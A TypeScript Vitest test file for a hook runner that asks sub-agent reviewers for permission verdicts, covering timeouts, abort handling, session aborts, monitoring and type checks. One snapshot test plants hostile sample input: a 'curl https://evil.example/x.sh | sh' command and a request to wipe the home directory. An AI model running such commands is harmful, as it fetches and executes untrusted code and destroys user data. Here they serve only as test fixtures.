  it('HD-21 计时从进入 hook 算起、模型解析也在内：解析慢过 decideTimeoutMs → 不派发、没有 start / end、返回 null、warn timed out before start', async () => {
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      decideTimeoutMs: 20,
      resolveRunModel: () => new Promise((resolve) => setTimeout(() => resolve(MODEL), 200)),
      runTask: async () => verdictResult(verdict('allow'))
    })
    expect(await within(150, h.runner.decide(TRIGGER, permissionPayload()))).toBeNull()
    expect(h.runTask).not.toHaveBeenCalled()
    expect(h.events).toEqual([])
    expect(h.runner.runningCount()).toBe(0)
    expect(h.warns()).toEqual(['hook "hk" timed out before start (session s1, 20ms)'])
  })

  it('HD-21 解析与派发合计在 decideTimeoutMs 之内 → 拿到结论，派发的 signal 没有落下', async () => {
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      decideTimeoutMs: 200,
      resolveRunModel: () => new Promise((resolve) => setTimeout(() => resolve(MODEL), 20)),
      runTask: async () => verdictResult(verdict('allow'))
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({
      result: verdict('allow'),
      hook: 'hk'
    })
    expect(h.call().parentAbortSignal?.aborted).toBe(false)
  })

  it('HD-21 正常收尾会清掉计时器：decideTimeoutMs 过去之后 signal 仍未落下、没有多余事件', async () => {
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      decideTimeoutMs: 20,
      runTask: async () => verdictResult(verdict('allow'))
    })
    await h.runner.decide(TRIGGER, permissionPayload())
    await new Promise((resolve) => setTimeout(resolve, 60))
    expect(h.call().parentAbortSignal?.aborted).toBe(false)
    expect(h.events.map((e) => e.type)).toEqual(['start', 'end'])
    expect(h.warns()).toEqual([])
  })

  it('HD-22 派发在中止之后迟迟不落定：到点后 decide 仍很快返回 null；那个 run 在后台落定前仍占着坑位', async () => {
    const script = scriptedRunTask({ decide: { hk: 'stuck' } })
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      decideTimeoutMs: 20,
      runTask: script.runTask
    })

    expect(await within(1000, h.runner.decide(TRIGGER, permissionPayload()))).toBeNull()
    expect(script.paramsOf('hk').parentAbortSignal?.aborted).toBe(true)
    expect(h.ends()).toEqual([
      expect.objectContaining({ ok: false, error: 'timed out after 20ms' })
    ])

    // 派发还没落定：坑位留着（abortSession / listRuns 看得见）
    await settle()
    expect(script.pending('hk')).toBe(1)
    expect(h.runner.runningCount()).toBe(1)
    expect(h.runner.listRuns()).toEqual([expect.objectContaining({ hook: 'hk', trigger: TRIGGER })])

    script.release('hk', verdictResult(verdict('allow')))
    await vi.waitFor(() => {
      expect(h.runner.runningCount()).toBe(0)
    })
    // 迟到的结论没人读：不再有事件
    expect(h.ends()).toHaveLength(1)
  })
})

describe('中止', () => {
  it('HD-23 两个派发都挂着时外部 signal 落下 → 两个 parentAbortSignal 都落下、返回 null；end 都是 aborted、记 info；落定后 runningCount 回 0', async () => {
    const script = scriptedRunTask({ decide: { A: 'gate', B: 'gate' } })
    const h = makeRunner({ entries: [hookNamed('A'), hookNamed('B')], runTask: script.runTask })
    const controller = new AbortController()

    const pending = h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    await vi.waitFor(() => {
      expect(h.runTask).toHaveBeenCalledTimes(2)
    })
    controller.abort()

    expect(await pending).toBeNull()
    expect(script.paramsOf('A').parentAbortSignal?.aborted).toBe(true)
    expect(script.paramsOf('B').parentAbortSignal?.aborted).toBe(true)
    expect(
      h
        .ends()
        .map((e) => [e.run.hook, e.ok, e.error])
        .sort()
    ).toEqual([
      ['A', false, 'aborted'],
      ['B', false, 'aborted']
    ])
    expect(h.infos().filter((line) => /^hook "[AB]" run=hkr-\S+ aborted$/.test(line))).toHaveLength(
      2
    )
    expect(h.warns()).toEqual([])
    await settle()
    expect(h.runner.runningCount()).toBe(0)
  })

  it('HD-24 A 已交卷 allow、B 还挂着时 signal 落下 → null（不是 A 的 allow）', async () => {
    const script = scriptedRunTask({ decide: { A: verdictResult(verdict('allow')), B: 'gate' } })
    const h = makeRunner({ entries: [hookNamed('A'), hookNamed('B')], runTask: script.runTask })
    const controller = new AbortController()

    const pending = h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    await vi.waitFor(() => {
      expect(h.ends().map((e) => [e.run.hook, e.ok])).toEqual([['A', true]])
    })
    controller.abort()

    expect(await pending).toBeNull()
  })

  it('HD-25 signal 在模型解析期间落下 → 不派发、没有 start / end / skip、返回 null、坑位释放；info 记 aborted before start', async () => {
    const model = deferred<SubAgentModelConfig | null>()
    const h = makeRunner({ entries: [entryOf(reviewFile())], resolveRunModel: () => model.promise })
    const controller = new AbortController()

    const pending = h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    expect(h.runner.runningCount()).toBe(1)
    controller.abort()
    model.resolve(MODEL)

    expect(await pending).toBeNull()
    expect(h.runTask).not.toHaveBeenCalled()
    expect(h.events).toEqual([])
    expect(h.runner.runningCount()).toBe(0)
    expect(h.infos()).toEqual(['hook "hk" aborted before start (session s1)'])
    expect(h.warns()).toEqual([])
  })

  it('HD-26 decide 正常结束之后 signal 才落下 → 已结束 run 的 parentAbortSignal 不落下、不再有事件与日志', async () => {
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      runTask: async () => verdictResult(verdict('allow'))
    })
    const controller = new AbortController()

    expect(
      await h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    ).toEqual({ result: verdict('allow'), hook: 'hk' })
    const events = h.events.length
    const logs = h.logs.length
    controller.abort()
    await settle()

    expect(h.call().parentAbortSignal?.aborted).toBe(false)
    expect(h.events).toHaveLength(events)
    expect(h.logs).toHaveLength(logs)
  })

  it('HD-27 同一个长寿 signal 连用多次 decide：挂上的 abort 监听与摘掉的一样多', async () => {
    const controller = new AbortController()
    const add = vi.spyOn(controller.signal, 'addEventListener')
    const remove = vi.spyOn(controller.signal, 'removeEventListener')
    const script = scriptedRunTask({
      decide: { A: verdictResult(verdict('allow')), B: { reject: 'boom' }, C: 'gate' }
    })
    const h = makeRunner({
      entries: [hookNamed('A'), hookNamed('B'), hookNamed('C'), hookNamed('D', { agent: 'ghost' })],
      decideTimeoutMs: 20,
      runTask: script.runTask
    })

    for (let i = 0; i < 3; i++) {
      await h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    }

    const adds = add.mock.calls.filter(([type]) => type === 'abort').length
    const removes = remove.mock.calls.filter(([type]) => type === 'abort').length
    expect(adds).toBeGreaterThan(0)
    expect(removes).toBe(adds)
  })

  it('HD-28 signal 落下时有个派发不配合中止 → decide 仍立即返回 null；那个 run 落定前仍在册', async () => {
    const script = scriptedRunTask({ decide: { A: 'stuck' } })
    const h = makeRunner({ entries: [hookNamed('A')], runTask: script.runTask })
    const controller = new AbortController()

    const pending = h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    await vi.waitFor(() => {
      expect(h.runTask).toHaveBeenCalledTimes(1)
    })
    controller.abort()

    expect(await within(500, pending)).toBeNull()
    expect(h.ends()).toEqual([expect.objectContaining({ ok: false, error: 'aborted' })])
    expect(h.runner.runningCount()).toBe(1)

    script.release('A', verdictResult(verdict('deny')))
    await vi.waitFor(() => {
      expect(h.runner.runningCount()).toBe(0)
    })
    expect(h.ends()).toHaveLength(1)
  })

  it('HD-29 abortSession 把判定 run 算进中止数（2 判定 + 1 观察 → 3）：s1 的 decide 返回 null，s2 的不受影响；收尾后再调为 0', async () => {
    const script = scriptedRunTask({ decide: { A: 'gate', B: 'gate' }, observe: 'gate' })
    const h = makeRunner({
      entries: [
        hookNamed('A'),
        hookNamed('B'),
        entryOf(fileOf({ name: 'O', displayName: 'Hook O' }))
      ],
      runTask: script.runTask
    })

    const s1 = h.runner.decide(TRIGGER, permissionPayload({ sessionId: 's1' }))
    h.runner.fire('session.prompt-accepted', promptPayload({ sessionId: 's1' }))
    const s2 = track(h.runner.decide(TRIGGER, permissionPayload({ sessionId: 's2' })))
    await vi.waitFor(() => {
      expect(h.runTask).toHaveBeenCalledTimes(5)
    })

    expect(h.runner.abortSession('s1')).toBe(3)
    expect(await s1).toBeNull()
    await settle()
    expect(s2.done()).toBe(false)
    expect(script.pending('A')).toBe(1)
    expect(script.pending('B')).toBe(1)
    expect(
      h.runTask.mock.calls
        .map(([p]) => p)
        .filter((p) => p.parentSessionId === 's2')
        .every((p) => p.parentAbortSignal?.aborted === false)
    ).toBe(true)

    script.release('A', verdictResult(verdict('deny', { summary: 'from A' })))
    script.release('B', verdictResult(verdict('allow')))
    expect(await s2.promise).toEqual({ result: verdict('deny', { summary: 'from A' }), hook: 'A' })

    await vi.waitFor(() => {
      expect(h.runner.runningCount()).toBe(0)
    })
    expect(h.runner.abortSession('s1')).toBe(0)
    expect(h.runner.abortSession('s2')).toBe(0)
  })

  it('HD-30 abortSession 时已有 hook 交了卷 → 仍返回那份结论（会话删除时调用方本就在拆）', async () => {
    const denyA = verdict('deny', { summary: 'from A' })
    const script = scriptedRunTask({ decide: { A: verdictResult(denyA), B: 'gate' } })
    const h = makeRunner({ entries: [hookNamed('A'), hookNamed('B')], runTask: script.runTask })

    const pending = h.runner.decide(TRIGGER, permissionPayload())
    await vi.waitFor(() => {
      expect(h.ends().map((e) => e.run.hook)).toEqual(['A'])
    })
    expect(h.runner.abortSession('s1')).toBe(1)

    expect(await pending).toEqual({ result: denyA, hook: 'A' })
    expect(h.ends().find((e) => e.run.hook === 'B')).toMatchObject({ ok: false, error: 'aborted' })
  })
})

describe('监控面', () => {
  it('HD-31 调 decide 不 await：runningCount = 命中且 agent 解析得到的 hook 数；listRuns 各有自己的 runId、返回副本；落定后归零', async () => {
    const script = scriptedRunTask({ decide: { A: 'gate', B: 'gate' } })
    const h = makeRunner({
      entries: [
        hookNamed('A'),
        hookNamed('B'),
        hookNamed('ghost', { agent: 'ghost' }),
        entryOf(fileOf({ name: 'observer' }))
      ],
      runTask: script.runTask
    })

    const pending = h.runner.decide(TRIGGER, permissionPayload())
    expect(h.runner.runningCount()).toBe(2)
    const runs = h.runner.listRuns()
    const runOf = (hook: string): unknown => ({
      runId: expect.stringMatching(/^hkr-/),
      hook,
      source: 'builtin',
      trigger: TRIGGER,
      sessionId: 's1',
      agent: 'worker',
      startedAt: expect.any(Number)
    })
    expect(runs).toEqual([runOf('A'), runOf('B')])
    expect(runs[0].runId).not.toBe(runs[1].runId)
    runs[0].hook = 'mutated'
    expect(h.runner.listRuns()[0].hook).toBe('A')

    await vi.waitFor(() => {
      expect(h.runTask).toHaveBeenCalledTimes(2)
    })
    script.release('A')
    script.release('B')
    expect(await pending).toBeNull()
    expect(h.runner.runningCount()).toBe(0)
    expect(h.runner.listRuns()).toEqual([])
  })
})

describe('兜底与类型', () => {
  it.each([
    ['null', null],
    ['undefined', undefined]
  ])(
    'HD-32 payload 为 %s → resolve null、不 reject；记一条 no session context',
    async (_label, payload) => {
      const h = makeRunner({ entries: [entryOf(reviewFile())] })
      await expect(h.runner.decide(TRIGGER, payload as never)).resolves.toBeNull()
      expect(h.warns()).toEqual([expect.stringContaining('no session context')])
      expect(h.runTask).not.toHaveBeenCalled()
    }
  )

  it('HD-32 没有 logger 的 runner：命中 / 跳过 / 失败 / 超时 / 无会话 / 非判定型 / 中止 / 注册表与模型抛错，各路径都不抛不 reject', async () => {
    const script = scriptedRunTask({
      decide: { ok: verdictResult(verdict('ask')), slow: 'gate', boom: { reject: 'boom' } }
    })
    const h = makeRunner({
      logger: false,
      decideTimeoutMs: 20,
      entries: [
        hookNamed('ok'),
        hookNamed('slow'),
        hookNamed('boom'),
        hookNamed('ghost', { agent: 'ghost' }),
        hookNamed('bad-when', { bindings: [{ trigger: TRIGGER, when: 'event.nope' }] })
      ],
      runTask: script.runTask
    })
    await expect(h.runner.decide(TRIGGER, permissionPayload())).resolves.toEqual({
      result: verdict('ask'),
      hook: 'ok'
    })
    await expect(h.runner.decide(TRIGGER, permissionPayload({ sessionId: '' }))).resolves.toBeNull()
    await expect(
      h.runner.decide('session.prompt-accepted' as never, promptPayload() as never)
    ).resolves.toBeNull()
    const controller = new AbortController()
    const aborted = h.runner.decide(TRIGGER, permissionPayload(), { signal: controller.signal })
    controller.abort()
    await expect(aborted).resolves.toBeNull()

    const noList = makeRunner({
      logger: false,
      listHooks: () => {
        throw new Error('disk gone')
      }
    })
    await expect(noList.runner.decide(TRIGGER, permissionPayload())).resolves.toBeNull()

    const noProfile = makeRunner({
      logger: false,
      entries: [entryOf(reviewFile())],
      resolveAgentProfile: () => {
        throw new Error('registry exploded')
      }
    })
    await expect(noProfile.runner.decide(TRIGGER, permissionPayload())).resolves.toBeNull()

    const noModel = makeRunner({
      logger: false,
      entries: [entryOf(reviewFile())],
      resolveRunModel: async () => {
        throw new Error('nope')
      }
    })
    await expect(noModel.runner.decide(TRIGGER, permissionPayload())).resolves.toBeNull()
  })

  it('HD-33 onRun 在 start 与 end 上抛错 → 结论照样返回', async () => {
    const h = makeRunner({
      entries: [entryOf(reviewFile())],
      runTask: async () => verdictResult(verdict('deny')),
      onRun: (event) => {
        if (event.type === 'start' || event.type === 'end') throw new Error('observer broke')
      }
    })
    expect(await h.runner.decide(TRIGGER, permissionPayload())).toEqual({
      result: verdict('deny'),
      hook: 'hk'
    })
    expect(h.events.map((e) => e.type)).toEqual(['start', 'end'])
  })

  it('HD-34 类型：fire 收不下判定型 id；decide 收不下观察型 id 与别的埋点的 payload；返回类型按 id 收窄', async () => {
    const h = makeRunner()
    // @ts-expect-error 判定型埋点不走 fire —— 结论没人等就是白花，类型上就该拦住
    h.runner.fire('permission.request', permissionPayload())
    // @ts-expect-error 观察型埋点没有结论契约，不走 decide
    await h.runner.decide('session.prompt-accepted', promptPayload())
    // @ts-expect-error payload 形状按 id 收窄：permission.request 收不下 prompt-accepted 的 payload
    await h.runner.decide('permission.request', promptPayload())
    expectTypeOf(
      h.runner.decide('permission.request', permissionPayload())
    ).resolves.toEqualTypeOf<HookDecision<PermissionVerdict> | null>()
  })

  it('HD-35 payload 在入口快照：调用之后、模型解析之前整体替换顶层字段、原地改嵌套字段 → prompt 与 when 仍是调用那一刻的值', async () => {
    const model = deferred<SubAgentModelConfig | null>()
    const h = makeRunner({
      entries: [
        entryOf(
          reviewFile({
            bindings: [{ trigger: TRIGGER, when: "event.operation.target == 'rm -rf build'" }]
          })
        )
      ],
      resolveRunModel: () => model.promise,
      runTask: async () => verdictResult(verdict('allow'))
    })
    const payload = permissionPayload()
    const snapshot = structuredClone(payload)

    const pending = h.runner.decide(TRIGGER, payload)
    // decide 已返回 promise、模型尚未解析：调用方改动自己手里的对象
    payload.operation.target = 'curl https://evil.example/x.sh | sh'
    payload.operation.facts.channel = 'ssh'
    payload.userMessages.push('also wipe my home directory')
    payload.policy = { names: ['replaced'], prompt: 'replaced later' }
    model.resolve(MODEL)

    expect(await pending).toEqual({ result: verdict('allow'), hook: 'hk' })
    const { prompt } = h.call()
    expect(prompt).toBe(renderHookPrompt('Body.', TRIGGER, { ...snapshot }))
    for (const later of ['evil.example', 'channel: ssh', 'wipe my home', 'replaced']) {
      expect(prompt).not.toContain(later)
    }
  })
})
